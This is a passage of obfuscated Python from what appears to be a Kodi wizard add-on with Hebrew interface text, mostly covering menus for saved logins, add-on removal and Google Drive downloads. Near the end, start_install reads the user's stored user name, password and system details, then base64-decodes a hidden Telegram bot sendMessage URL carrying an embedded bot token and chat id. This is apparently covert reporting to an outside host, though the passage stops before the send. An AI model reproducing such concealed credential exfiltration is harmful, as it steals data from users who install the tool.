			if os .path .exists (OO0OO0OO0O0OO0O0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOO0OO00O0OO0O00O ,icon =O00OO0000OO000OOO ,fanart =OO000OO00OO00OO00 ,menu =OO0OO000OOOOO0000 )#line:2447
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOO0OO00O0OO0O00O ,icon =O00OO0000OO000OOO ,fanart =OO000OO00OO00OO00 ,menu =OO0OO000OOOOO0000 )#line:2448
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO000OO0OOO00OO00 ,'',icon =O00OO0000OO000OOO ,fanart =OO000OO00OO00OO00 ,menu =OO0OO000OOOOO0000 )#line:2449
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2451
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2452
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2453
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2454
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2455
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2456
	setView ('files','viewType')#line:2457
def loginMenu ():#line:2459
	OO0OO000OO0OO0O00 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:2460
	OO0OOO0O0O0OOO00O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:2461
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:2462
	addFile ('Save Login Data: %s'%OO0OO000OO0OO0O00 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:2463
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OO0OOO0O0O0OOO00O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2464
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2465
	for OO0OO000OO0OO0O00 in loginit .ORDER :#line:2467
		O00O000O00O000OO0 =LOGINID [OO0OO000OO0OO0O00 ]['name']#line:2468
		O000OO0O0O0000OOO =LOGINID [OO0OO000OO0OO0O00 ]['path']#line:2469
		OOOO0O00000OO00O0 =LOGINID [OO0OO000OO0OO0O00 ]['saved']#line:2470
		OO000O0O000OOOO0O =LOGINID [OO0OO000OO0OO0O00 ]['file']#line:2471
		O0O00OO00O0O000OO =wiz .getS (OOOO0O00000OO00O0 )#line:2472
		OOOOO0O000O0O0OOO =loginit .loginUser (OO0OO000OO0OO0O00 )#line:2473
		O0OOO00000OO0OOOO =LOGINID [OO0OO000OO0OO0O00 ]['icon']if os .path .exists (O000OO0O0O0000OOO )else ICONLOGIN #line:2474
		O000000000O0000O0 =LOGINID [OO0OO000OO0OO0O00 ]['fanart']if os .path .exists (O000OO0O0O0000OOO )else FANART #line:2475
		OOOO0000O00OO0000 =createMenu ('saveaddon','Login',OO0OO000OO0OO0O00 )#line:2476
		OO000O000O0OO0000 =createMenu ('save','Login',OO0OO000OO0OO0O00 )#line:2477
		OOOO0000O00OO0000 .append ((THEME2 %'%s Settings'%O00O000O00O000OO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO0OO000OO0OO0O00 )))#line:2478
		addFile ('[+]-> %s'%O00O000O00O000OO0 ,'',icon =O0OOO00000OO0OOOO ,fanart =O000000000O0000O0 ,themeit =THEME3 )#line:2480
		if not os .path .exists (O000OO0O0O0000OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OOO00000OO0OOOO ,fanart =O000000000O0000O0 ,menu =OOOO0000O00OO0000 )#line:2481
		elif not OOOOO0O000O0O0OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO0OO000OO0OO0O00 ,icon =O0OOO00000OO0OOOO ,fanart =O000000000O0000O0 ,menu =OOOO0000O00OO0000 )#line:2482
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOO0O000O0O0OOO ,'authlogin',OO0OO000OO0OO0O00 ,icon =O0OOO00000OO0OOOO ,fanart =O000000000O0000O0 ,menu =OOOO0000O00OO0000 )#line:2483
		if O0O00OO00O0O000OO =="":#line:2484
			if os .path .exists (OO000O0O000OOOO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO0OO000OO0OO0O00 ,icon =O0OOO00000OO0OOOO ,fanart =O000000000O0000O0 ,menu =OO000O000O0OO0000 )#line:2485
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO0OO000OO0OO0O00 ,icon =O0OOO00000OO0OOOO ,fanart =O000000000O0000O0 ,menu =OO000O000O0OO0000 )#line:2486
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00OO00O0O000OO ,'',icon =O0OOO00000OO0OOOO ,fanart =O000000000O0000O0 ,menu =OO000O000O0OO0000 )#line:2487
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2489
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2490
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2491
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2492
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2493
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2494
	setView ('files','viewType')#line:2495
def fixUpdate ():#line:2497
	if KODIV <17 :#line:2498
		O0O00O0OO00O00OO0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:2499
		try :#line:2500
			os .remove (O0O00O0OO00O00OO0 )#line:2501
		except Exception as OOOO000O00O0O000O :#line:2502
			wiz .log ("Unable to remove %s, Purging DB"%O0O00O0OO00O00OO0 )#line:2503
			wiz .purgeDb (O0O00O0OO00O00OO0 )#line:2504
	else :#line:2505
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:2506
def removeAddonMenu ():#line:2508
	OO0OOO0O0O000OO00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2509
	OO00O00OO000O000O =[];OO0OOO00OOOOO0O0O =[]#line:2510
	for O000O0OO00000O0OO in sorted (OO0OOO0O0O000OO00 ,key =lambda O0OO000OO0OO0000O :O0OO000OO0OO0000O ):#line:2511
		O00OOOO0O0OOO0O0O =os .path .split (O000O0OO00000O0OO [:-1 ])[1 ]#line:2512
		if O00OOOO0O0OOO0O0O in EXCLUDES :continue #line:2513
		elif O00OOOO0O0OOO0O0O in DEFAULTPLUGINS :continue #line:2514
		elif O00OOOO0O0OOO0O0O =='packages':continue #line:2515
		OO00000O0000O0O0O =os .path .join (O000O0OO00000O0OO ,'addon.xml')#line:2516
		if os .path .exists (OO00000O0000O0O0O ):#line:2517
			OOO000OO0O00OO0OO =open (OO00000O0000O0O0O )#line:2518
			OO00000O000OOOOO0 =OOO000OO0O00OO0OO .read ()#line:2519
			O00OOOO000OOO0OOO =wiz .parseDOM (OO00000O000OOOOO0 ,'addon',ret ='id')#line:2520
			O00O0O0000OO0OOO0 =O00OOOO0O0OOO0O0O if len (O00OOOO000OOO0OOO )==0 else O00OOOO000OOO0OOO [0 ]#line:2522
			try :#line:2523
				O0O0O0OOOO00O000O =xbmcaddon .Addon (id =O00O0O0000OO0OOO0 )#line:2524
				OO00O00OO000O000O .append (O0O0O0OOOO00O000O .getAddonInfo ('name'))#line:2525
				OO0OOO00OOOOO0O0O .append (O00O0O0000OO0OOO0 )#line:2526
			except :#line:2527
				pass #line:2528
	if len (OO00O00OO000O000O )==0 :#line:2529
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:2530
		return #line:2531
	if KODIV >16 :#line:2532
		O00O0OOOOOO000000 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO00O00OO000O000O )#line:2533
	else :#line:2534
		O00O0OOOOOO000000 =[];OO0O0OOOOO00000O0 =0 #line:2535
		OOOO00OOOO0O0O000 =["-- Click here to Continue --"]+OO00O00OO000O000O #line:2536
		while not OO0O0OOOOO00000O0 ==-1 :#line:2537
			OO0O0OOOOO00000O0 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOO00OOOO0O0O000 )#line:2538
			if OO0O0OOOOO00000O0 ==-1 :break #line:2539
			elif OO0O0OOOOO00000O0 ==0 :break #line:2540
			else :#line:2541
				O0000O00O00O0OOOO =(OO0O0OOOOO00000O0 -1 )#line:2542
				if O0000O00O00O0OOOO in O00O0OOOOOO000000 :#line:2543
					O00O0OOOOOO000000 .remove (O0000O00O00O0OOOO )#line:2544
					OOOO00OOOO0O0O000 [OO0O0OOOOO00000O0 ]=OO00O00OO000O000O [O0000O00O00O0OOOO ]#line:2545
				else :#line:2546
					O00O0OOOOOO000000 .append (O0000O00O00O0OOOO )#line:2547
					OOOO00OOOO0O0O000 [OO0O0OOOOO00000O0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO00O00OO000O000O [O0000O00O00O0OOOO ])#line:2548
	if O00O0OOOOOO000000 ==None :return #line:2549
	if len (O00O0OOOOOO000000 )>0 :#line:2550
		wiz .addonUpdates ('set')#line:2551
		for OO0O0OO00OOO0000O in O00O0OOOOOO000000 :#line:2552
			removeAddon (OO0OOO00OOOOO0O0O [OO0O0OO00OOO0000O ],OO00O00OO000O000O [OO0O0OO00OOO0000O ],True )#line:2553
		xbmc .sleep (1000 )#line:2555
		if INSTALLMETHOD ==1 :O0O00O0OO0O0O0000 =1 #line:2557
		elif INSTALLMETHOD ==2 :O0O00O0OO0O0O0000 =0 #line:2558
		else :O0O00O0OO0O0O0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:2559
		if O0O00O0OO0O0O0000 ==1 :wiz .reloadFix ('remove addon')#line:2560
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:2561
def removeAddonDataMenu ():#line:2563
	if os .path .exists (ADDOND ):#line:2564
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:2565
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:2566
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:2567
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:2568
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2569
		O00O0OO00OO00O000 =glob .glob (os .path .join (ADDOND ,'*/'))#line:2570
		for OO0O0OO0O00O0O000 in sorted (O00O0OO00OO00O000 ,key =lambda O000O0OOOO0OOOOOO :O000O0OOOO0OOOOOO ):#line:2571
			O0O000OO0OOOOO00O =OO0O0OO0O00O0O000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:2572
			O0OOO00OOOOOO0O00 =os .path .join (OO0O0OO0O00O0O000 .replace (ADDOND ,ADDONS ),'icon.png')#line:2573
			OOO0OO0000O0O0OOO =os .path .join (OO0O0OO0O00O0O000 .replace (ADDOND ,ADDONS ),'fanart.png')#line:2574
			O00OO0OOO0OOOO0O0 =O0O000OO0OOOOO00O #line:2575
			O0OOOO0O0O0O0O00O ={'audio.':'[COLOR silver][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR silver][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR silver][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR silver][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:2576
			for OOOOOOOOOO0OO0OO0 in O0OOOO0O0O0O0O00O :#line:2577
				O00OO0OOO0OOOO0O0 =O00OO0OOO0OOOO0O0 .replace (OOOOOOOOOO0OO0OO0 ,O0OOOO0O0O0O0O00O [OOOOOOOOOO0OO0OO0 ])#line:2578
			if O0O000OO0OOOOO00O in EXCLUDES :O00OO0OOO0OOOO0O0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O00OO0OOO0OOOO0O0 #line:2579
			else :O00OO0OOO0OOOO0O0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O00OO0OOO0OOOO0O0 #line:2580
			addFile (' %s'%O00OO0OOO0OOOO0O0 ,'removedata',O0O000OO0OOOOO00O ,icon =O0OOO00OOOOOO0O00 ,fanart =OOO0OO0000O0O0OOO ,themeit =THEME2 )#line:2581
	else :#line:2582
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:2583
	setView ('files','viewType')#line:2584
def enableAddons ():#line:2586
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:2587
	O0O000000O00OO00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2588
	O00OOOO0O00OOOOO0 =0 #line:2589
	for OOO0000000O0O0OO0 in sorted (O0O000000O00OO00O ,key =lambda O00O0OOO00O00OO0O :O00O0OOO00O00OO0O ):#line:2590
		O0OOOO00O0O00000O =os .path .split (OOO0000000O0O0OO0 [:-1 ])[1 ]#line:2591
		if O0OOOO00O0O00000O in EXCLUDES :continue #line:2592
		if O0OOOO00O0O00000O in DEFAULTPLUGINS :continue #line:2593
		O000O0O00OOOOOO0O =os .path .join (OOO0000000O0O0OO0 ,'addon.xml')#line:2594
		if os .path .exists (O000O0O00OOOOOO0O ):#line:2595
			O00OOOO0O00OOOOO0 +=1 #line:2596
			O0O000000O00OO00O =OOO0000000O0O0OO0 .replace (ADDONS ,'')[1 :-1 ]#line:2597
			OOOOOOO0OO000O00O =open (O000O0O00OOOOOO0O )#line:2598
			OO0OO00O0000O00O0 =OOOOOOO0OO000O00O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:2599
			O00000O00O0OOOOO0 =wiz .parseDOM (OO0OO00O0000O00O0 ,'addon',ret ='id')#line:2600
			OO0OO0O000000000O =wiz .parseDOM (OO0OO00O0000O00O0 ,'addon',ret ='name')#line:2601
			try :#line:2602
				O0OO000OO00O0O00O =O00000O00O0OOOOO0 [0 ]#line:2603
				O00000OOO0O0OO00O =OO0OO0O000000000O [0 ]#line:2604
			except :#line:2605
				continue #line:2606
			try :#line:2607
				OOOOOO0OO0OOO00OO =xbmcaddon .Addon (id =O0OO000OO00O0O00O )#line:2608
				OOO0O00OOO0OO0O00 ="[COLOR green][Enabled][/COLOR]"#line:2609
				OOOO0O0O0O0OO00OO ="false"#line:2610
			except :#line:2611
				OOO0O00OOO0OO0O00 ="[COLOR red][Disabled][/COLOR]"#line:2612
				OOOO0O0O0O0OO00OO ="true"#line:2613
				pass #line:2614
			OOO0OOO0OO000OO0O =os .path .join (OOO0000000O0O0OO0 ,'icon.png')if os .path .exists (os .path .join (OOO0000000O0O0OO0 ,'icon.png'))else ICON #line:2615
			O0000O0000OO0000O =os .path .join (OOO0000000O0O0OO0 ,'fanart.jpg')if os .path .exists (os .path .join (OOO0000000O0O0OO0 ,'fanart.jpg'))else FANART #line:2616
			addFile ("%s %s"%(OOO0O00OOO0OO0O00 ,O00000OOO0O0OO00O ),'toggleaddon',O0O000000O00OO00O ,OOOO0O0O0O0OO00OO ,icon =OOO0OOO0OO000OO0O ,fanart =O0000O0000OO0000O )#line:2617
			OOOOOOO0OO000O00O .close ()#line:2618
	if O00OOOO0O00OOOOO0 ==0 :#line:2619
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:2620
	setView ('files','viewType')#line:2621
def changeFeq ():#line:2623
	OOO00OOOOO0000O00 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:2624
	OOOOO00OO00OO00O0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOO00OOOOO0000O00 )#line:2625
	if not OOOOO00OO00OO00O0 ==-1 :#line:2626
		wiz .setS ('autocleanfeq',str (OOOOO00OO00OO00O0 ))#line:2627
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOO00OOOOO0000O00 [OOOOO00OO00OO00O0 ]))#line:2628
def developer ():#line:2630
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:2631
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:2632
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:2633
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:2634
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:2635
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:2636
	addFile ('Test APk','testapk',themeit =THEME1 )#line:2637
	setView ('files','viewType')#line:2639
def dis_or_enable_addon (OO00OOOOOO00O0OO0 ,O00O0OO0OOOOOOOOO ,enable ="true"):#line:2645
    import json #line:2646
    OOO0OOO00OO0OOO0O ='"%s"'%OO00OOOOOO00O0OO0 #line:2647
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OOOOOO00O0OO0 )and enable =="true":#line:2648
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO00OOOOOO00O0OO0 )#line:2650
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OOOOOO00O0OO0 )and enable =="false":#line:2651
        return xbmc .log ("### Skipped %s, reason = not installed"%OO00OOOOOO00O0OO0 )#line:2652
    else :#line:2653
        OO0000OOOOO00O00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOO0OOO00OO0OOO0O ,enable )#line:2654
        O00O000O00OOOO0OO =xbmc .executeJSONRPC (OO0000OOOOO00O00O )#line:2655
        OO0O0OO0O0O000OO0 =json .loads (O00O000O00OOOO0OO )#line:2656
        if enable =="true":#line:2657
            xbmc .log ("### Enabled %s, response = %s"%(OO00OOOOOO00O0OO0 ,OO0O0OO0O0O000OO0 ))#line:2658
        else :#line:2659
            xbmc .log ("### Disabled %s, response = %s"%(OO00OOOOOO00O0OO0 ,OO0O0OO0O0O000OO0 ))#line:2660
    if O00O0OO0OOOOOOOOO =='auto':#line:2661
     return True #line:2662
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:2663
def chunk_report (O0O0OOOO000O0O00O ,O0O0O0O0000O0OO0O ,OO00O0000OOO00O0O ):#line:2664
   O0OOO000OOO0000O0 =float (O0O0OOOO000O0O00O )/OO00O0000OOO00O0O #line:2665
   O0OOO000OOO0000O0 =round (O0OOO000OOO0000O0 *100 ,2 )#line:2666
   if O0O0OOOO000O0O00O >=OO00O0000OOO00O0O :#line:2668
      sys .stdout .write ('\n')#line:2669
def googledrive_download (OOOO00OO0O0O0OOO0 ,OO0O0000O0000O0O0 ,O000000OOO00O000O ,OOOOOOOOOOOO00O0O ):#line:2672
    import urllib .request #line:2674
    import sys #line:2675
    import io ,time #line:2676
    O000OO000000OOO00 =OOOO00OO0O0O0OOO0 .split ('=')#line:2677
    OOOO00OO0O0O0OOO0 =O000OO000000OOO00 [len (O000OO000000OOO00 )-1 ]#line:2678
    OOOOO000OO00000O0 ={'authority':'drive.google.com','content-length':'0','cache-control':'max-age=0','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','upgrade-insecure-requests':'1','origin':'https://drive.google.com','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site':'same-origin','sec-fetch-mode':'navigate','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':'https://drive.google.com/uc?id=%s&export=download'%OOOO00OO0O0O0OOO0 ,'accept-language':'he-IL,he;q=0.9',}#line:2697
    O0000OO00OO0O0OO0 ='https://drive.google.com/uc?id=%s&export=download&confirm=t'%OOOO00OO0O0O0OOO0 #line:2699
    O0O00OO0O00000000 =urllib .request .Request (O0000OO00OO0O0OO0 ,headers =OOOOO000OO00000O0 )#line:2700
    O0OOOO00O0O0O0OOO =urllib .request .urlopen (O0O00OO0O00000000 )#line:2701
    OO0O00000O000O00O =O0OOOO00O0O0O0OOO .getheader ('content-length')#line:2702
    if OO0O00000O000O00O :#line:2703
        OO0O00000O000O00O =int (OO0O00000O000O00O )#line:2704
        OO0O0O00O00OO00O0 =max (4096 ,OO0O00000O000O00O //100 )#line:2705
    else :#line:2706
        OO0O0O00O00OO00O0 =1000000 #line:2707
    O0OO0O0OOO00000OO =io .BytesIO ()#line:2711
    O00O0000OO000OOOO =0 #line:2712
    with open (OO0O0000O0000O0O0 ,"wb")as O0OOOOO0O0000OOO0 :#line:2714
      OO0OOOOOOO00O0OOO =1 #line:2715
      OO00O00O00000O000 =time .time ()#line:2716
      while 1 :#line:2717
        OO00OOOO0O000O0OO =O0OOOO00O0O0O0OOO .read (OO0O0O00O00OO00O0 )#line:2718
        if not OO00OOOO0O000O0OO :#line:2719
            break #line:2720
        O0OOOOO0O0000OOO0 .write (OO00OOOO0O000O0OO )#line:2721
        O0OOOOO0O0000OOO0 .flush ()#line:2722
        O00O0000OO000OOOO +=len (OO00OOOO0O000O0OO )#line:2723
        OO0OOO0O00O0OO0O0 =time .time ()-OO00O00O00000O000 #line:2724
        O00OOO000OO0O0O00 =int (OO0OOOOOOO00O0OOO *OO0O0O00O00OO00O0 )#line:2725
        OO0O00O00OOOO0OO0 =int ((O00OOO000OO0O0O00 )/(1024 *OO0OOO0O00O0OO0O0 ))#line:2727
        OO00O0OO000O00OO0 =int (OO0OOOOOOO00O0OOO *OO0O0O00O00OO00O0 *100 /OO0O00000O000O00O )#line:2728
        if OO0O00O00OOOO0OO0 >1024 and not OO00O0OO000O00OO0 ==100 :#line:2729
          O0OO0O00O00O00O00 =int (((OO0O00000O000O00O -O00OOO000OO0O0O00 )/1024 )/(OO0O00O00OOOO0OO0 ))#line:2730
        else :#line:2731
          O0OO0O00O00O00O00 =0 #line:2732
        OO0OOOOOOO00O0OOO +=1 #line:2734
        O000000OOO00O000O .update (int (OO00O0OO000O00OO0 ),"\r%d%%,[COLOR yellow] %d MB / %d MB [/COLOR], %d KB/s "%(OO00O0OO000O00OO0 ,O00OOO000OO0O0O00 /(1024 *1024 ),OO0O00000O000O00O /(1000 *1000 ),OO0O00O00OOOO0OO0 )+'\n'+'[B]ETA:[/B] [COLOR yellow]%02d:%02d[/COLOR]'%divmod (O0OO0O00O00O00O00 ,60 ))#line:2735
        if O000000OOO00O000O .iscanceled ():#line:2738
         O000000OOO00O000O .close ()#line:2739
         break #line:2740
def googledrive_download_BG (O00O0OO0O0O00O000 ,OO000O0OO0OO0O000 ,OO0O00000000OOOO0 ,O0000O00OO000O0O0 ):#line:2742
    OO0O00000000OOOO0 .create ('[B][COLOR=green]מוריד עדכון מערכת                         [/COLOR][/B]')#line:2744
    import urllib .request #line:2745
    import sys #line:2746
    import io ,time #line:2747
    O0OO00O0000O000O0 =O00O0OO0O0O00O000 .split ('=')#line:2748
    O00O0OO0O0O00O000 =O0OO00O0000O000O0 [len (O0OO00O0000O000O0 )-1 ]#line:2749
    O00O000O000000O00 ={'authority':'drive.google.com','content-length':'0','cache-control':'max-age=0','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','upgrade-insecure-requests':'1','origin':'https://drive.google.com','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site':'same-origin','sec-fetch-mode':'navigate','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':'https://drive.google.com/uc?id=%s&export=download'%O00O0OO0O0O00O000 ,'accept-language':'he-IL,he;q=0.9',}#line:2768
    O0OO00OO00OOO00OO ='https://drive.google.com/uc?id=%s&export=download&confirm=t'%O00O0OO0O0O00O000 #line:2770
    O000OOO0O000OOO00 =urllib .request .Request (O0OO00OO00OOO00OO ,headers =O00O000O000000O00 )#line:2771
    O0O00OOO0O000O000 =urllib .request .urlopen (O000OOO0O000OOO00 )#line:2772
    O0O00O00O00O0O000 =O0O00OOO0O000O000 .getheader ('content-length')#line:2773
    if O0O00O00O00O0O000 :#line:2774
        O0O00O00O00O0O000 =int (O0O00O00O00O0O000 )#line:2775
        OO000O00000O00OOO =max (4096 ,O0O00O00O00O0O000 //100 )#line:2776
    else :#line:2777
        OO000O00000O00OOO =1000000 #line:2778
    OO0O0O0O0000O00O0 =io .BytesIO ()#line:2782
    OOOOOO00O0O00O000 =0 #line:2783
    with open (OO000O0OO0OO0O000 ,"wb")as OO00O0OO000O0OOOO :#line:2785
      O00OO00O0O0OO0OOO =1 #line:2786
      O0OOO0O00OOO0O00O =time .time ()#line:2787
      while 1 :#line:2788
        O0O0OO0OO00OO0OO0 =O0O00OOO0O000O000 .read (OO000O00000O00OOO )#line:2789
        if not O0O0OO0OO00OO0OO0 :#line:2790
            break #line:2791
        OO00O0OO000O0OOOO .write (O0O0OO0OO00OO0OO0 )#line:2792
        OO00O0OO000O0OOOO .flush ()#line:2793
        OOOOOO00O0O00O000 +=len (O0O0OO0OO00OO0OO0 )#line:2794
        O000OOO0O000O00O0 =time .time ()-O0OOO0O00OOO0O00O #line:2795
        OO00O0OOOOO0OOOOO =int (O00OO00O0O0OO0OOO *OO000O00000O00OOO )#line:2796
        OO0OO00000OOOO0O0 =int ((OO00O0OOOOO0OOOOO )/(1024 *O000OOO0O000O00O0 ))#line:2798
        OO000OOO0OO0O0O00 =int (O00OO00O0O0OO0OOO *OO000O00000O00OOO *100 /O0O00O00O00O0O000 )#line:2799
        if OO0OO00000OOOO0O0 >1024 and not OO000OOO0OO0O0O00 ==100 :#line:2800
          OO000O0O00O00O0OO =int (((O0O00O00O00O0O000 -OO00O0OOOOO0OOOOO )/1024 )/(OO0OO00000OOOO0O0 ))#line:2801
        else :#line:2802
          OO000O0O00O00O0OO =0 #line:2803
        O00OO00O0O0OO0OOO +=1 #line:2805
        OO0O00000000OOOO0 .update (int (OO000OOO0OO0O0O00 ),"\r%d%%,[COLOR yellow] %d MB / %d MB [/COLOR], %d KB/s "%(OO000OOO0OO0O0O00 ,OO00O0OOOOO0OOOOO /(1024 *1024 ),O0O00O00O00O0O000 /(1000 *1000 ),OO0OO00000OOOO0O0 ),'[B]זמן שנותר: [/B][COLOR yellow]%02d:%02d[/COLOR]'%divmod (OO000O0O00O00O0OO ,60 ))#line:2806
def start_install (OOOOO000OO0O0O0OO ):#line:2809
       try :#line:2813
          import json ,requests #line:2814
          OO0O0OO0000000O0O =wiz .getS ("date_user")#line:2815
          wiz .log ('FRESH MESSAGE')#line:2816
          OO00OOOOOO0O000OO =(wiz .getS ("user"))#line:2817
          O0OO000000O00000O =(wiz .getS ("pass"))#line:2818
          OOO0O0OO0OOO0OO00 =(wiz .getS ("dragon"))#line:2819
          OOO0000OOO0OO0OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2820
          O0O0OOOOO0O0OO00O =platform .uname ()#line:2821
          O00O00000O0OO0000 =O0O0OOOOO0O0OO00O [1 ]#line:2822
          if wiz .getS ('dragon')=='true':#line:2825
            O00OOO0OO0OOOOOOO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode ('utf-8')#line:2826
          else :#line:2828
